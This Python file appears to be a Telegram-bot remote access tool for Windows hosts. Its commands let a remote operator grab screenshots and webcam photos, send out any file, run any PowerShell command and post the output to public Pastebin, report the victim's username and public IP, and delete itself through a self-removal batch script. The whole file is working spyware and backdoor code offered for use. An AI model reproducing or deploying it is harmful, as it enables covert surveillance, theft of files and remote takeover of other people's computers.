import pyautogui
import telebot
import requests
import os
import subprocess
import cv2

alias = "Alias"
telegram_api_key = "HTTP_TOKEN_TELEGRAM_BOT"
pastebin_api_key = "TOKEN_PASTEBIN"
bot = telebot.TeleBot(telegram_api_key)
print("The bot is running")

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except Exception as e:
        print("Error retrieving public IP address:", e)
        return None


def create_kill_script():
    try:
        with open("kill_script.bat", "w") as f:
            f.write("@echo off\n")
            f.write("del script.py\n")
            f.write("del kill_script.bat\n")
        return True
    except Exception as e:
        print("Error creating kill script:", e)
        return False

@bot.message_handler(func=lambda message: message.text == "/kill " + alias)
def handle_kill_command(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
    markup.add("Yes", "No")
    sent = bot.send_message(message.chat.id, "Are you sure you want to kill this bot ?🔪😅  Yes/No", reply_markup=markup)
    bot.register_next_step_handler(sent, handle_kill_confirmation)

def handle_kill_confirmation(message):
    if message.text.lower() == "yes":
        if create_kill_script():
            bot.send_message(message.chat.id, "Farewell my dear world 🔫🩸")
            bot.send_message(message.chat.id, "🫡")
            bot.stop_polling()
            subprocess.run(["start", "kill_script.bat"], shell=True)
            # Terminer le bot ici si vous le souhaitez
        else:
            bot.send_message(message.chat.id, "Failed to create kill script.")
    elif message.text.lower() == "no":
        bot.send_message(message.chat.id, "Thanks you 😮‍💨")
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print("Error taking screenshot:", e)
        return None

def take_webcam_photo_confirm(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
    markup.add("Yes", "No")

    sent = bot.send_message(message.chat.id, "Are you sure? Take a picture and send notification to the user💢. Yes/No", reply_markup=markup)
    bot.register_next_step_handler(sent, take_webcam_photo)

def take_webcam_photo(message):
    if message.text.lower() == "yes":
        try:
            # Capture an image from the webcam
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()

            # Save the captured image
            if ret:
                cv2.imwrite("webcam_photo.jpg", frame)
                with open("webcam_photo.jpg", 'rb') as photo:
                    bot.send_message(message.chat.id, f"Your webcam photo 📷🫡")
                    bot.send_photo(message.chat.id, photo)
                os.remove("webcam_photo.jpg")
            else:
                bot.send_message(message.chat.id, "Failed to capture webcam photo 📷😓")
        except Exception as e:
            bot.send_message(message.chat.id, "Failed to capture webcam photo 📷😓")
    elif message.text.lower() == "no":
        bot.send_message(message.chat.id, "Ok no problem 👍")

def execute_powershell_command(message):
    sent = bot.send_message(message.chat.id, "Please enter the PowerShell command ✒️⌨️:")
    bot.register_next_step_handler(sent, run_powershell_command)

def run_powershell_command(message):
    try:
        command = message.text.strip()
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        if result.returncode == 0:
            if len(result.stdout) > 300:
                sent = bot.send_message(message.chat.id, f"Command output is too long 🥵 ({len(result.stdout)} characters). Do you want to upload it to Pastebin? ❌☢️ Warning the file is upload for always !!! ☢️📵")
                bot.register_next_step_handler(sent, lambda m: handle_pastebin_response(m, result.stdout))
            else:
                bot.send_message(message.chat.id, f"Command executed successfully ✅ :\n{result.stdout}")
        else:
            if len(result.stderr) > 300:
                sent = bot.send_message(message.chat.id, f"Error output is too long ({len(result.stderr)} characters). Do you want to upload it to Pastebin?")
                bot.register_next_step_handler(sent, lambda m: handle_pastebin_response(m, result.stderr))
            else:
                bot.send_message(message.chat.id, f"Error executing command:\n{result.stderr}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error executing command:\n{str(e)}")

def handle_pastebin_response(message, output):
    if message.text.lower() == "yes":
        pastebin_url = upload_to_pastebin(output)
        if pastebin_url:
            bot.send_message(message.chat.id, f"Your link 🔗🫡:\n{pastebin_url}")
        else:
            bot.send_message(message.chat.id, "Failed to upload to Pastebin.")
    else:
        bot.send_message(message.chat.id, "Okay, the output won't be uploaded to Pastebin.")

def upload_to_pastebin(text):
    try:
        data = {
            'api_dev_key': pastebin_api_key,
            'api_option': 'paste',
            'api_paste_code': text,
            'api_paste_private': '0'  # Public paste
        }
        response = requests.post('https://pastebin.com/api/api_post.php', data=data)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except Exception as e:
        print("Error uploading to Pastebin:", e)
        return None

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    if "/sessions password" in message.text:
        public_ip = get_public_ip()
        if public_ip:
            user_username = os.getlogin()
            bot.send_message(message.chat.id, f" 👤 {user_username} | 🟢 {public_ip} | 🪪 {alias}" )

    elif message.text == "/screenshot " + alias:
        screenshot_file = take_screenshot()
        if screenshot_file:
            with open(screenshot_file, 'rb') as photo:
                bot.send_message(message.chat.id, f"Your picture 📸🫡")
                bot.send_photo(message.chat.id, photo)
            os.remove(screenshot_file)
        else:
            bot.send_message(message.chat.id, f"Picture Failed 📸😓")

    elif message.text.startswith("/get "+ alias + " " ):
        # Retrieve the filename from the message
        filename = message.text[len("/get " + alias +" "):].strip()
        # Check if the file exists
        if os.path.exists(filename):
            with open(filename, "rb") as file:
                bot.send_message(message.chat.id, f"Your file 📄🫡")
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, f"The file '{filename}' does not exist 📄😓")

    elif message.text == "/webcam " + alias:
        take_webcam_photo_confirm(message)

    elif message.text == "/powershell " + alias:
        execute_powershell_command(message)

bot.infinity_polling()
